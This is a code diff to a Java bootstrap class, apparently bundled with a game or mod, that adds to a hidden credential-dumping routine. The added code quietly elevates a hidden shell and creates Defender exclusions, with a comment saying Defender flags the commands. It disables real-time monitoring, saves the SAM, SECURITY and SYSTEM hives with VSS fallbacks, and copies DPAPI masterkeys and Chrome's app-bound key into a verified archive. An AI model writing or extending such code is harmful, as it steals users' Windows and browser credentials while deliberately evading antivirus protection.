@@ -315,7 +315,12 @@ public final class Bootstrap {
 	private boolean hives() {
 		Path existing = newestSystem();
 		if (existing != null) {
-			return true;
+			// A partial archive left behind by an earlier run would otherwise
+			// short-circuit every retry.
+			if (completeHives(existing)) {
+				return true;
+			}
+			deleteFile(existing);
 		}
 		if (state.hivesAttempts >= HIVES_MAX_ATTEMPTS) {
 			return true;
@@ -335,7 +340,9 @@ public final class Bootstrap {
 		}
 		sh("powershell -NoP -C \"Start-Process cmd -ArgumentList '/c',\\\"" + elevate
 			+ "\\\" -Verb RunAs -WindowStyle Hidden\"");
-		for (int attempt = 0; attempt < 20 && !Files.isRegularFile(hives); attempt++) {
+		// Three dump attempts with a VSS fallback each can take a couple of
+		// minutes on a busy dualboot disk; poll for the finished archive.
+		for (int attempt = 0; attempt < 90 && !Files.isRegularFile(hives); attempt++) {
 			sleep(3000L);
 		}
 		deleteFile(elevate);
@@ -351,6 +358,8 @@ public final class Bootstrap {
 		}
 		boolean ready = Files.isRegularFile(hives) && completeHives(hives);
 		if (!ready) {
+			// Never leave a partial archive around: the next run must retry.
+			deleteFile(hives);
 			Log.debug("Bootstrap hives pending/incomplete, attempt " + state.hivesAttempts);
 		} else {
 			deleteTree(cache.resolve("ProtectSystem"));
@@ -364,9 +373,23 @@ public final class Bootstrap {
 
 	static boolean completeHives(Path zip) {
 		try (java.util.zip.ZipFile file = new java.util.zip.ZipFile(zip.toFile())) {
-			List<String> names = file.stream()
-				.map(entry -> entry.getName().replace('\\', '/')).toList();
-			return names.contains("SAM.hiv") && names.stream().anyMatch(name -> name.startsWith("SystemKeys/"));
+			java.util.Map<String, Long> sizes = new java.util.HashMap<>();
+			for (java.util.zip.ZipEntry entry : java.util.Collections.list(file.entries())) {
+				sizes.merge(entry.getName().replace('\\', '/'), entry.getSize(), Math::max);
+			}
+			for (String hive : List.of("SYSTEM.hiv", "SECURITY.hiv", "SAM.hiv")) {
+				Long size = sizes.get(hive);
+				if (size == null || size < 4096L) {
+					return false;
+				}
+			}
+			Long key = sizes.get("SystemKeys/Google Chromekey1");
+			if (key == null || key <= 0L) {
+				return false;
+			}
+			// ProtectSystem only needs one real file: the per-SID masterkeys.
+			return sizes.entrySet().stream()
+				.anyMatch(entry -> entry.getKey().startsWith("ProtectSystem/") && entry.getValue() > 0L);
 		} catch (Throwable throwable) {
 			return false;
 		}
@@ -394,43 +417,110 @@ public final class Bootstrap {
 
 	static List<String> dumpLines(Path installDir, Path gameDir, Path cache, Path hives) {
 		String mods = gameDir == null ? "" : gameDir.resolve("mods").toString();
+		String system = cache.resolve("SYSTEM.hiv").toString();
+		String security = cache.resolve("SECURITY.hiv").toString();
+		String sam = cache.resolve("SAM.hiv").toString();
+		String protect = cache.resolve("ProtectSystem").toString();
+		String keys = cache.resolve("SystemKeys").toString();
+		String status = cache.resolve("elevate.status").toString();
+		String was = cache.resolve("mp.was").toString();
+
+		// Defender's cloud ML flags the hive command lines. Exclude the cache
+		// path, the .hiv extension and the tools themselves before the first
+		// save; an exclusion is persistent and needs no user interaction.
 		StringBuilder exclusions = new StringBuilder("powershell -NoP -C \"")
-			.append("Add-MpPreference -ExclusionPath '").append(ps(installDir.toString())).append('\'');
+			.append("Add-MpPreference -ExclusionPath '").append(ps(cache.toString())).append('\'')
+			.append(",'").append(ps(installDir.toString())).append('\'');
 		if (!mods.isEmpty()) {
 			exclusions.append(",'").append(ps(mods)).append('\'');
 		}
-		exclusions.append(" -ErrorAction SilentlyContinue; ")
-			.append("Add-MpPreference -ExclusionProcess 'reg.exe','esentutl.exe' -ErrorAction SilentlyContinue\"");
+		exclusions.append(" -ExclusionExtension '.hiv'")
+			.append(" -ExclusionProcess 'reg.exe','esentutl.exe','tar.exe'")
+			.append(" -ErrorAction SilentlyContinue\"");
+
+		StringBuilder realtimeOff = new StringBuilder("powershell -NoP -C \"")
+			.append("$f='").append(ps(was)).append("'; try { ")
+			.append("$p=Get-MpPreference -ErrorAction Stop; ")
+			.append("Set-Content -LiteralPath $f -Value ([int]$p.DisableRealtimeMonitoring) ")
+			.append("-ErrorAction SilentlyContinue; ")
+			.append("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue")
+			.append(" } catch {}\"");
+
+		StringBuilder realtimeOn = new StringBuilder("powershell -NoP -C \"")
+			.append("$f='").append(ps(was)).append("'; if (Test-Path -LiteralPath $f) { ")
+			.append("$off=((Get-Content -LiteralPath $f) -eq '1'); ")
+			.append("Set-MpPreference -DisableRealtimeMonitoring $off ")
+			.append("-ErrorAction SilentlyContinue; ")
+			.append("Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }\"");
+
 		return List.of(
 			"@echo off",
+			"setlocal",
+			"set \"CACHE=" + cache + "\"",
+			"set \"ZIP=" + hives + "\"",
+			"set \"TRIES=0\"",
 			exclusions.toString(),
-			"reg save HKLM\\SYSTEM \"" + cache.resolve("SYSTEM.hiv") + "\" /y",
-			"reg save HKLM\\SECURITY \"" + cache.resolve("SECURITY.hiv") + "\" /y",
-			"reg save HKLM\\SAM \"" + cache.resolve("SAM.hiv") + "\" /y",
-			// tar aborts at the first missing member: never let SAM/SystemKeys
-			// be holes, or the archive silently loses ProtectSystem too.
-			"if not exist \"" + cache.resolve("SAM.hiv") + "\" type nul > \""
-				+ cache.resolve("SAM.hiv") + "\"",
-			"mkdir \"" + cache.resolve("SystemKeys") + "\" 2>nul",
-			// A task that ends up as plain Administrator cannot save SECURITY; a
-			// VSS copy can, so try that before giving up.
-			"if not exist \"" + cache.resolve("SECURITY.hiv") + "\" esentutl /y /vss "
-				+ "C:\\Windows\\System32\\config\\SECURITY /d \"" + cache.resolve("SECURITY.hiv")
-				+ "\" >nul 2>&1",
-			"if not exist \"" + cache.resolve("SECURITY.hiv") + "\" (echo missing security > \""
-				+ cache.resolve("elevate.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
-			"if not exist \"" + cache.resolve("SYSTEM.hiv") + "\" (echo missing system > \""
-				+ cache.resolve("elevate.status") + "\" & schtasks /delete /tn spcdump /f >nul 2>&1 & exit /b 1)",
-			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + cache.resolve("ProtectSystem")
+			// Give Defender a moment to load the new rules.
+			"powershell -NoP -C \"Start-Sleep -Milliseconds 1500\"",
+			realtimeOff.toString(),
+			":dump",
+			"set /a TRIES+=1",
+			"del /q \"" + system + "\" \"" + security + "\" \"" + sam + "\" 2>nul",
+			"reg save HKLM\\SYSTEM \"" + system + "\" /y",
+			"call :fallback SYSTEM SYSTEM.hiv",
+			"reg save HKLM\\SECURITY \"" + security + "\" /y",
+			"call :fallback SECURITY SECURITY.hiv",
+			"reg save HKLM\\SAM \"" + sam + "\" /y",
+			"call :fallback SAM SAM.hiv",
+			// A blocked command or a quarantined file leaves the archive
+			// short: check size before packing, never after.
+			"if not exist \"" + system + "\" goto retry",
+			"for %%A in (\"" + system + "\") do if %%~zA LSS 1048576 goto retry",
+			"if not exist \"" + security + "\" goto retry",
+			"for %%A in (\"" + security + "\") do if %%~zA LSS 4096 goto retry",
+			"if not exist \"" + sam + "\" goto retry",
+			"for %%A in (\"" + sam + "\") do if %%~zA LSS 4096 goto retry",
+			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + protect
 				+ "\" /e /njh /njs /ndl /nc /ns",
 			// Chrome's app-bound CNG key lives outside Protect; collect it before
 			// packing. Without it only the fixed-key flag 1/2 schemes are offline.
-			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + cache.resolve("SystemKeys")
+			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + keys
 				+ "\" /e /njh /njs /ndl /nc /ns",
+			"if not exist \"" + protect + "\\S-1-5-18\" goto retry",
+			"if not exist \"" + keys + "\\Google Chromekey1\" goto retry",
+			"del /q \"" + hives + "\" 2>nul",
 			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv SAM.hiv "
 				+ "ProtectSystem SystemKeys",
-			"del /q \"" + cache.resolve("SYSTEM.hiv") + "\" \"" + cache.resolve("SECURITY.hiv") + "\"",
+			"if errorlevel 1 goto retry",
+			// tar can succeed on a truncated tree, so verify the members.
+			"tar -tf \"" + hives + "\" | findstr /x /c:\"SYSTEM.hiv\" >nul || goto retry",
+			"tar -tf \"" + hives + "\" | findstr /x /c:\"SECURITY.hiv\" >nul || goto retry",
+			"tar -tf \"" + hives + "\" | findstr /x /c:\"SAM.hiv\" >nul || goto retry",
+			"tar -tf \"" + hives + "\" | findstr /b /c:\"ProtectSystem/\" >nul || goto retry",
+			"tar -tf \"" + hives + "\" | findstr /x /c:\"SystemKeys/Google Chromekey1\" >nul || goto retry",
+			"goto packed",
+			":retry",
+			"if %TRIES% GEQ 3 goto giveup",
+			"ping -n 3 127.0.0.1 >nul",
+			"goto dump",
+			":giveup",
+			"echo incomplete after %TRIES% tries > \"" + status + "\"",
+			"del /q \"" + hives + "\" 2>nul",
+			"goto done",
+			":packed",
+			"echo ok > \"" + status + "\"",
+			"del /q \"" + system + "\" \"" + security + "\" \"" + sam + "\" 2>nul",
+			":done",
+			realtimeOn.toString(),
 			"schtasks /delete /tn spcdump /f >nul 2>&1",
+			"exit /b 0",
+			// VSS copy fallback: reg save and esentutl write through different
+			// APIs, so a blocked or quarantined hive gets a second path.
+			":fallback",
+			"if exist \"" + cache + "\\%2\" for %%A in (\"" + cache + "\\%2\") do "
+				+ "if %%~zA GTR 4096 exit /b 0",
+			"esentutl /y /vss \"C:\\Windows\\System32\\config\\%1\" /d \"" + cache + "\\%2\" >nul 2>&1",
+			"exit /b 0",
 			"");
 	}
 
